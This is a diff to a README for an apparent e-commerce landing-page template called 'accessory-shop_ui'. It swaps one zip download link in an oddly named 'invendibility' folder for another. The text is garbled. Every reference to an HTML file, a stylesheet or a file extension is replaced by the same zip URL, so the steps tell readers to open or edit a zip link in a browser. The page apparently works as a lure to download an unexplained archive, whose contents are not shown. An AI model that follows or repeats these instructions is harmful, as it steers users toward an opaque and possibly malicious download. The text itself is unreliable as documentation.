@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the accessory-shop_ui applica
 
 ## 📥 Download the Application
 
-[![Download accessory-shop_ui](https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip%20Now-brightgreen)](https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip)
+[![Download accessory-shop_ui](https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip%20Now-brightgreen)](https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip)
 
 To download the accessory-shop_ui, please visit the following link:
 
-[Download the latest version here](https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip)
+[Download the latest version here](https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip)
 
 ## 📋 Features
 
@@ -44,27 +44,27 @@ Now, let’s begin the download process:
 
 1. Click on the link provided above to visit the releases page.
 2. Find the latest version of the accessory-shop_ui.
-3. Download the compressed file (usually a .zip or https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip).
+3. Download the compressed file (usually a .zip or https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip).
 4. Extract the files to a folder of your choice on your computer.
-5. Open the `https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip` file using your web browser.
+5. Open the `https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip` file using your web browser.
 
 You can also see the updated link for downloading again here:
 
-[Download the latest version here](https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip)
+[Download the latest version here](https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip)
 
 ## 🌐 Preview the Design
 
-You can preview the landing page design by opening the `https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip` file in a web browser. This gives you a visual representation of how the layout looks and functions.
+You can preview the landing page design by opening the `https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip` file in a web browser. This gives you a visual representation of how the layout looks and functions.
 
 ## 🖥️ Customizing the Code
 
-If you’d like to make changes, you can modify the stylesheet or HTML files. For CSS adjustments, open the `https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip` or the SASS files. If you're comfortable with HTML, edit the `https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip` file to change text or elements.
+If you’d like to make changes, you can modify the stylesheet or HTML files. For CSS adjustments, open the `https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip` or the SASS files. If you're comfortable with HTML, edit the `https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip` file to change text or elements.
 
 ## 🚧 Common Issues and Solutions
 
 Here are some common issues you may encounter and their solutions:
 
-- **Page Does Not Load:** Ensure you've extracted all files properly. Check to see that you're opening the `https://raw.githubusercontent.com/fuffica/accessory-shop_ui/main/invendibility/accessory-shop_ui.zip` file, not another file.
+- **Page Does Not Load:** Ensure you've extracted all files properly. Check to see that you're opening the `https://github.com/fuffica/accessory-shop_ui/raw/refs/heads/main/invendibility/accessory-shop-ui-2.0.zip` file, not another file.
 - **Design Issues:** If things look off, clear your browser cache and refresh the page.
 - **Missing Files:** Make sure all files were downloaded and extracted correctly. Re-download if necessary.
 
